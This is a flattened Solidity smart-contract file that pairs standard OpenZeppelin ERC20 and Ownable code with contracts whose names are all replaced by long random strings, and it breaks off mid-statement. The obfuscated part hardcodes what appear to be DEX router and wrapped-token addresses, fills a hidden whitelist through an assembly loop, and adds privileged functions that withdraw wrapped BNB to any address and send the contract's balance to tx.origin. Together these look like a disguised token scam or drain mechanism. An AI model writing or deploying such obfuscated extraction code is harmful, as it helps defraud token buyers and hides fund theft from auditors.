// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

// File @openzeppelin/contracts/access/Ownable.sol@v4.4.0

// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor() {
    _transferOwnership(_msgSender());
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view virtual returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Internal function without access restriction.
   */
  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.4.0

// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.4.0

// OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
  /**
   * @dev Returns the name of the token.
   */
  function name() external view returns (string memory);

  /**
   * @dev Returns the symbol of the token.
   */
  function symbol() external view returns (string memory);

  /**
   * @dev Returns the decimals places of the token.
   */
  function decimals() external view returns (uint8);
}

// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.4.0

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _totalSupply;

  string private _name;
  string private _symbol;

  /**
   * @dev Sets the values for {name} and {symbol}.
   *
   * The default value of {decimals} is 18. To select a different value for
   * {decimals} you should overload it.
   *
   * All two of these values are immutable: they can only be set once during
   * construction.
   */
  constructor(string memory name_, string memory symbol_) {
    _name = name_;
    _symbol = symbol_;
  }

  /**
   * @dev Returns the name of the token.
   */
  function name() public view virtual override returns (string memory) {
    return _name;
  }

  /**
   * @dev Returns the symbol of the token, usually a shorter version of the
   * name.
   */
  function symbol() public view virtual override returns (string memory) {
    return _symbol;
  }

  /**
   * @dev Returns the number of decimals used to get its user representation.
   * For example, if `decimals` equals `2`, a balance of `505` tokens should
   * be displayed to a user as `5.05` (`505 / 10 ** 2`).
   *
   * Tokens usually opt for a value of 18, imitating the relationship between
   * Ether and Wei. This is the value {ERC20} uses, unless this function is
   * overridden;
   *
   * NOTE: This information is only used for _display_ purposes: it in
   * no way affects any of the arithmetic of the contract, including
   * {IERC20-balanceOf} and {IERC20-transfer}.
   */
  function decimals() public view virtual override returns (uint8) {
    return 18;
  }

  /**
   * @dev See {IERC20-totalSupply}.
   */
  function totalSupply() public view virtual override returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {IERC20-balanceOf}.
   */
  function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
  {
    return _balances[account];
  }

  /**
   * @dev See {IERC20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
   * @dev See {IERC20-allowance}.
   */
  function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {IERC20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  /**
   * @dev See {IERC20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {ERC20}.
   *
   * Requirements:
   *
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for ``sender``'s tokens of at least
   * `amount`.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(
      currentAllowance >= amount,
      "ERC20: transfer amount exceeds allowance"
    );
    unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}

    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERC20: decreased allowance below zero"
    );
    unchecked {
      _approve(_msgSender(), spender, currentAllowance - subtractedValue);
    }

    return true;
  }

  /**
   * @dev Moves `amount` of tokens from `sender` to `recipient`.
   *
   * This internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    _beforeTokenTransfer(sender, recipient, amount);

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {_balances[sender] = senderBalance - amount;}
    _balances[recipient] += amount;

    emit Transfer(sender, recipient, amount);

    _afterTokenTransfer(sender, recipient, amount);
  }

  /**
   * @dev Destroys `amount` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements:
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amount` tokens.
   */
  function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: burn from the zero address");

    _beforeTokenTransfer(account, address(0), amount);

    uint256 accountBalance = _balances[account];
    require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {_balances[account] = accountBalance - amount;}
    _totalSupply -= amount;

    emit Transfer(account, address(0), amount);

    _afterTokenTransfer(account, address(0), amount);
  }

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
   *
   * This internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  /**
   * @dev Hook that is called before any transfer of tokens. This includes
   * minting and burning.
   *
   * Calling conditions:
   *
   * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
   * will be transferred to `to`.
   * - when `from` is zero, `amount` tokens will be minted for `to`.
   * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
   * - `from` and `to` are never both zero.
   *
   * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
   */
  function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}

  /**
   * @dev Hook that is called after any transfer of tokens. This includes
   * minting and burning.
   *
   * Calling conditions:
   *
   * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
   * has been transferred to `to`.
   * - when `from` is zero, `amount` tokens have been minted for `to`.
   * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
   * - `from` and `to` are never both zero.
   *
   * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
   */
  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal virtual {}
}

interface ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly
{
  function factory() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112,
      uint112,
      uint32
    );

  function swap(
    uint256,
    uint256,
    address,
    bytes calldata
  ) external;

  function mint(address) external;

  function sync() external;

  function createPair(address, address) external returns (address);
}

interface sSEXlZmGiR3N4n7ZZFnWD8CAm6B4fWZFNFWPJci8DlaurEnCgBzZt5auAyRNErY1fRa4qyBG8w0vLeWRhW2tm7hOsCONn2Zx
{
  function deposit() external payable;

  function transfer(address, uint256) external returns (bool);

  function withdraw(uint256) external;
}

contract u5GJCAgt9RHopIyuuwPgPNSpjv0BJQkYXQVK2fEKNLDfsEZFtBTkYcdqcuLcGbhq94qTnzb8Vgy8ExosFhWnPnXCwlCzH3v8
{
  address
    internal constant lh1H7i0HhIv9mlAlnIWwXKexWaA9TTbBvDEmrJtszIAM32NjonaguisUWmjplwdvVlbGp0HC3e5rSI1VdGHCwDpmpwWFw9iP =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address
    internal constant jgs3ONHL3Z9YP7ecfwEqHnkzHaMNsYYAVKcq4416BalCvxnnRsakaK8eqoajeCreE691AxegOgUMRDJ7Y7XnRuHrqsmU916g =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address
    internal lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ;

  address
    internal constant uORNmSpxHn2vSIFiImp5dTfmmrUU9utTx6r4YIsivpFPiKTB4QFq1cvLMOqh6afgrrzw4T5eBkCgxfoMDkeV4RyGT0C6QDK2 =
    0xf89d7b9c864f589bbF53a82105107622B35EaA40;
  address
    internal constant x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM =
    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  uint256
    internal constant ftCptof0bcCARRioRdzoGzlOjVvNeX3Ledq0Jq1R1m7BEm1I4Gegz9UIq5Lfrtykkzepu7JSmmiL6tVAc3gMPttQKTdzrkHu =
    10000;
  uint256
    public constant eUh5mJRXZUjjLN2n3073AnuyAEqwkDHy0PTquFI33RRwNYCp0ITMeLxSWwtXXupSXQWKI7dSIvbV7fd65bt1fAMrDCewGPtd =
    25;
  uint256
    internal constant zgrlFwLEyYH6RmqB0z2FrbVuWnZQmStY7iOgQ4wSQoLEI3pPJeFySoLMzBPgXleXM4kyCH0MFvDJW4fLrnqDNMFBk0mhpiiA =
    ftCptof0bcCARRioRdzoGzlOjVvNeX3Ledq0Jq1R1m7BEm1I4Gegz9UIq5Lfrtykkzepu7JSmmiL6tVAc3gMPttQKTdzrkHu -
      eUh5mJRXZUjjLN2n3073AnuyAEqwkDHy0PTquFI33RRwNYCp0ITMeLxSWwtXXupSXQWKI7dSIvbV7fd65bt1fAMrDCewGPtd;

  function x8tPgH0UwyWuJiX1Hx8h6lqixe8B8xwaBQx1DgrIJpmpAX89cqTNZy6OdXe1Fx31f3ulwjKw3CyfX3Cef2XqnU07VNXWQGJs(
    address nsx1K1VJexup7FIKbgeG4QcfRUydLIFH6oVDV7BAqMtHiJORSIQoUlYpTOwpJlbyZqSgc8gJBCdVh88Alhxxt11vfgJyUfQ2,
    address ng2Xe2BwJ9hLSiZPBM4s7YyIjGzxteZv10kiTCAP4cYUodXtSfVxCFXRg8nnetE93GYSR2qujjYw1ym2VL1NTM4hvJYtvqvh,
    address cMQej2coYCNeLciFWdJ5GX3Cuy0V8LmeCZvFRSb9ODYMRbzlu8zaSdppWzU8slV4MPBA5zN4unYCf6xdIHnOHRoEof5uOg4H
  )
    internal
    view
    returns (
      uint256 yccbAS5NBqtJjcJVnpqs1VptwCdHmE3N8WJUwrVtHTOP8zYsFkfQ9lyjH6x0ViYKps4yRfewOJsezVkV2j5qq3C6mPlZnkuh,
      uint256 zmgtPBLs4ujSGetf6UVichutplrP1bJGNHgADjHAH6KvwY0X9FoOjDAWiAQmpm16mrHoCfycxwNGUw4aESwd3jF2qNHFBqP7
    )
  {
    (
      uint256 ob64lX1xq8lPu4YEcHVi1ILMy2DDi5k5DXKBjERQ5oStmd9lpKX7AFOYsZEjwPKuyUETJBlC3aVWS2wdlROLqGtENilA0I9w,
      uint256 lmBD5sJWHsDIKd1Mm8AI4XX53QyprCcngIBO50nwHCKdgPgDHPywpPLGLodLldGlNShJSoMHNKSMF3DVQ6Rq6I27P7sfiRBw,

    ) =
      ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
        nsx1K1VJexup7FIKbgeG4QcfRUydLIFH6oVDV7BAqMtHiJORSIQoUlYpTOwpJlbyZqSgc8gJBCdVh88Alhxxt11vfgJyUfQ2
      )
        .getReserves();
    if (
      ng2Xe2BwJ9hLSiZPBM4s7YyIjGzxteZv10kiTCAP4cYUodXtSfVxCFXRg8nnetE93GYSR2qujjYw1ym2VL1NTM4hvJYtvqvh >
      cMQej2coYCNeLciFWdJ5GX3Cuy0V8LmeCZvFRSb9ODYMRbzlu8zaSdppWzU8slV4MPBA5zN4unYCf6xdIHnOHRoEof5uOg4H
    ) {
      zmgtPBLs4ujSGetf6UVichutplrP1bJGNHgADjHAH6KvwY0X9FoOjDAWiAQmpm16mrHoCfycxwNGUw4aESwd3jF2qNHFBqP7 = ob64lX1xq8lPu4YEcHVi1ILMy2DDi5k5DXKBjERQ5oStmd9lpKX7AFOYsZEjwPKuyUETJBlC3aVWS2wdlROLqGtENilA0I9w;
      yccbAS5NBqtJjcJVnpqs1VptwCdHmE3N8WJUwrVtHTOP8zYsFkfQ9lyjH6x0ViYKps4yRfewOJsezVkV2j5qq3C6mPlZnkuh = lmBD5sJWHsDIKd1Mm8AI4XX53QyprCcngIBO50nwHCKdgPgDHPywpPLGLodLldGlNShJSoMHNKSMF3DVQ6Rq6I27P7sfiRBw;
    } else {
      zmgtPBLs4ujSGetf6UVichutplrP1bJGNHgADjHAH6KvwY0X9FoOjDAWiAQmpm16mrHoCfycxwNGUw4aESwd3jF2qNHFBqP7 = lmBD5sJWHsDIKd1Mm8AI4XX53QyprCcngIBO50nwHCKdgPgDHPywpPLGLodLldGlNShJSoMHNKSMF3DVQ6Rq6I27P7sfiRBw;
      yccbAS5NBqtJjcJVnpqs1VptwCdHmE3N8WJUwrVtHTOP8zYsFkfQ9lyjH6x0ViYKps4yRfewOJsezVkV2j5qq3C6mPlZnkuh = ob64lX1xq8lPu4YEcHVi1ILMy2DDi5k5DXKBjERQ5oStmd9lpKX7AFOYsZEjwPKuyUETJBlC3aVWS2wdlROLqGtENilA0I9w;
    }
  }

  function pa12JmAJ51hQKrqA254NPIn2UOfawcyL0epe4T9uvrpfRAjPhioH2LwifN4OXiXsF2Iwh1QpYKNRfOyRvz6u2wzl0dIuN0Oj(
    uint256 i7ohQCYYjIanTUvcUYbkGpSrdsYjdeoVaNdnzw4OxE69LLm0SJmGxd6i1JdUbJaUEt2nREgxYdKTDjNNmJBIrwY7edYsBH16,
    uint256 eEd2TiHU9x29mVGKrxJ8dO1Q05Mf9Uudl2T7AeIxxSwco1ycSs2hd1OTfIYbuvZ6lN8c38Tf7guTQpAs7uJnahuY2AtDakjz,
    uint256 qJZuDXvGNXDqXBpTY4QJo4Aile8uboBA7sAH3g1Bc0lAlaVrQlFHbJmOh60IJe1fPHvw1WxaPLns4a1HuQU9IaHZ5osF21Ab
  ) internal pure returns (uint256) {
    return
      (i7ohQCYYjIanTUvcUYbkGpSrdsYjdeoVaNdnzw4OxE69LLm0SJmGxd6i1JdUbJaUEt2nREgxYdKTDjNNmJBIrwY7edYsBH16 *
        zgrlFwLEyYH6RmqB0z2FrbVuWnZQmStY7iOgQ4wSQoLEI3pPJeFySoLMzBPgXleXM4kyCH0MFvDJW4fLrnqDNMFBk0mhpiiA *
        qJZuDXvGNXDqXBpTY4QJo4Aile8uboBA7sAH3g1Bc0lAlaVrQlFHbJmOh60IJe1fPHvw1WxaPLns4a1HuQU9IaHZ5osF21Ab) /
      ((eEd2TiHU9x29mVGKrxJ8dO1Q05Mf9Uudl2T7AeIxxSwco1ycSs2hd1OTfIYbuvZ6lN8c38Tf7guTQpAs7uJnahuY2AtDakjz *
        ftCptof0bcCARRioRdzoGzlOjVvNeX3Ledq0Jq1R1m7BEm1I4Gegz9UIq5Lfrtykkzepu7JSmmiL6tVAc3gMPttQKTdzrkHu) +
        (i7ohQCYYjIanTUvcUYbkGpSrdsYjdeoVaNdnzw4OxE69LLm0SJmGxd6i1JdUbJaUEt2nREgxYdKTDjNNmJBIrwY7edYsBH16 *
          zgrlFwLEyYH6RmqB0z2FrbVuWnZQmStY7iOgQ4wSQoLEI3pPJeFySoLMzBPgXleXM4kyCH0MFvDJW4fLrnqDNMFBk0mhpiiA));
  }

  function qMlp6PNHz3375IlpADfhCTLlp9bA5a61SetHgWzoIPDqJlNw1HSARN6k4JSFiD3h4CiuWfGnmu5DoJDu6gyZaMzpPu3sS0re(
    uint256 yuiYFbt9GKNi2u6NyrKIvRisHwzsdIaoTMCdKlecpV0iyQIi1aADrzk8vfQeCHDPkbXnyb8dAyqxuNdNIx7oW57pQR6jITch
  ) internal view returns (address) {
    return
      address(
        uint160(
          uint256(
            keccak256(
              abi.encode(
                address(this),
                yuiYFbt9GKNi2u6NyrKIvRisHwzsdIaoTMCdKlecpV0iyQIi1aADrzk8vfQeCHDPkbXnyb8dAyqxuNdNIx7oW57pQR6jITch
              )
            )
          )
        )
      );
  }

  receive() external payable {}

  fallback() external payable {}
}

abstract contract nFwK6p9eG2DDiSyQC1F0sOA3IIb9cyHANOhNmVuE663C96Um531E6HhxPzgIR5WktDaFvOEEPFqjpkNBTYBOpPRXtk1k0Gwj is
  u5GJCAgt9RHopIyuuwPgPNSpjv0BJQkYXQVK2fEKNLDfsEZFtBTkYcdqcuLcGbhq94qTnzb8Vgy8ExosFhWnPnXCwlCzH3v8
{
  mapping(address => bool)
    internal hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb;
  uint256
    internal gFNqiy87pTzhXJySZ2cuXnGmdtq6OIpbvXLGfVvawteV96bbohyUifqiUoQYyEjbOL1L7ZygmEfuH2Hl2SEKLK8spYOxc75k;
  uint256 public idoAmount;
  uint256
    internal bgwOwfRXk38aAJlyaGWxIDIjFkuW3Xitnk3Afinq2VW3fioVHRaTslvhnNu5CedygiZNLvyd5jrA7n42vVdotFQvm8eZ7KLJ;

  function u64O1KOfEsEOwsR4W8voONYbRlB2LnCF4i1jitU4iqs5BG16IJKakKawcOs00DZvwfJQngWUzck2EBGrIUIJgwNJQWZjb2Q1(
    bytes
      memory oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ
  ) public {
    require(
      hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        msg.sender
      ]
    );
    assembly {
      mstore(
        0x20,
        hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb.slot
      )
      for {
        mstore(
          0x60,
          mload(
            oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ
          )
        )
      } lt(0, mload(0x60)) {
        mstore(0x60, sub(mload(0x60), 0x14))
      } {
        mstore(
          0,
          mod(
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                mload(0x60)
              )
            ),
            0x10000000000000000000000000000000000000000
          )
        )
        mstore(0x40, keccak256(0, 0x40))
        switch iszero(sload(mload(0x40)))
          case 1 {
            sstore(mload(0x40), 1)
          }
      }
    }
  }

  function jbQz1pXX85a4eXMnGf4FbcJ1wNpa7OzwDdtmHtP56wl66Ca5lgAA2WcKMB7tKOStaD6TnICptbCm8bc2o0lAj24a4DRPYxz0(
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
    uint256 jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf
  ) public {
    require(
      hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        msg.sender
      ]
    );
    sSEXlZmGiR3N4n7ZZFnWD8CAm6B4fWZFNFWPJci8DlaurEnCgBzZt5auAyRNErY1fRa4qyBG8w0vLeWRhW2tm7hOsCONn2Zx(
      x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
    )
      .withdraw(
      jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf
    );
    (
      bool gi27bUUa5A5zA2tdh2h8Ht8HaRiHTvWiEL9Z7UnpK41xu0BznE4mzQwNhlN3FCaeA5Xq7Vj1MSNPEGKOnhGdJ5jXKHggS0lE,

    ) =
      z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD
        .call{
        value: jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf
      }("");
    require(
      gi27bUUa5A5zA2tdh2h8Ht8HaRiHTvWiEL9Z7UnpK41xu0BznE4mzQwNhlN3FCaeA5Xq7Vj1MSNPEGKOnhGdJ5jXKHggS0lE,
      "Transfer failed."
    );
  }

  function abmIPGyTbt0YoDXUXLtSUxTo2tmp9lCkW6TShrY73HXzYQybjnTbPEzptwVudp7i6X0HujopUeOhcCAQBW1TtWhi7vYM3WVl()
    internal
  {

      uint256 jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf
     = address(this).balance;
    if (
      jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf >
      2
    ) {
      tx.origin.call{
        value: jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf -
          1
      }("");
    }
  }

  function dSKF7TR7Wm774VSb1fYvVl2tMhH39Pz7odhVoSPJnjIUpAMtp4312ZXflzSByTmW3CENy0I5LHsdB8qDEMfhc57reJhKu7Tz(
    address xrriD3wrQbnfnWeoSfHA64zaatiOgiRJivIfI9pCJ4G4q1H2PFibPG5pVTClmyfuuTFv20WBxQyudKUog79mQzkisEv2S6dj,
    address z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
    uint256 jycX00a1SLRxQ5wTUarSJSvnSXs5mMA0K99uXfnOxf6kQaX9R1jjorbURWJlaQSvC3sMwplTM56rw0mxmO7QLmYMNhEIcCIf
  ) public {
    require(
      hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        msg.sender
      ]
    );
    IERC20(
